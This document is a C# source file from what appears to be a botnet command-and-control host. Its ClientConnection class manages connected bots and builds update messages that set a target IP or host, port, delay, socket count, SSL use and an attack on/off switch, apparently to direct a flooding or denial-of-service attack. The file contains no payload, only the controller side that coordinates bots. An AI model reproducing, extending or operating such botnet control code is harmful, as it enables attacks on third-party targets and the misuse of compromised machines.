using System;
using System.Collections.Generic;
using System.Linq;
using System.Net.Sockets;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace BotnetHost
{
    class ClientConnection
    {
        // Client Variables
        public Boolean isAlive = true;
        public Thread clientThread;
        public Socket clientSocket;
        public Guid guid = new Guid();
        public string clientName = "";
        // Data Variables
        public string hostOrIP = "localhost";
        public int port = 12345;
        public int delay = 15000;
        public int sockets = 8;
        public Boolean useSSL = false;
        public Boolean attack = false;
        public Boolean restart = false;

        // Constructor
        public ClientConnection (Thread thread, Socket socket)
        {
            this.clientThread = thread;
            this.clientSocket = socket;
            clientName = socket.RemoteEndPoint.ToString();
        }
        // Build update for client
        public string buildUpdate(string[] otherUpdates)
        {
            string[] updates = new string[7 + otherUpdates.Length];

            updates[0] = "IP: " + hostOrIP + "";
            updates[1] = "Port: " + port + "";
            updates[2] = "Delay: " + delay + "";
            updates[3] = "Sockets: " + sockets + "";
            updates[4] = "UseSSL: " + useSSL.ToString() + "";
            updates[5] = "Attack: " + attack.ToString() + "";
            updates[6] = "Restart: " + restart.ToString() + "";

            string output = "";
            int updateCount = 0;
            for (int i = 0; i < updates.Length; i++)
            {
                if (i != (updates.Length - 1))
                {
                    output += "[" + updates[i] + "],";
                }
                else 
                {
                    if (otherUpdates.Length == 0)
                    {
                        output += "[" + updates[i] + "]";
                    } else
                    {
                        output += "[" + updates[i] + "],";
                    }
                }
                updateCount++;
            }

            for (int s = 0; s < otherUpdates.Length; s++)
            {
                if (s != (otherUpdates.Length - 1))
                {
                    output += "[" + otherUpdates[s] + "],";
                }
                else
                {
                    output += "[" + otherUpdates[s] + "]";
                }
                updateCount++;
            }
            output = output.Replace(",[]", "");

            return output;
        }
        // Shutdown & Close Socket and Abort thread
        public void killClient()
        {
            isAlive = false;
            try
            {
                clientSocket.Shutdown(SocketShutdown.Both);
            }
            catch (Exception er) { }
            try
            {
                clientSocket.Close();
            }
            catch (Exception er) { }
            try
            {
                clientThread.Abort();
            }
            catch (Exception er) { }
        }
    }
}
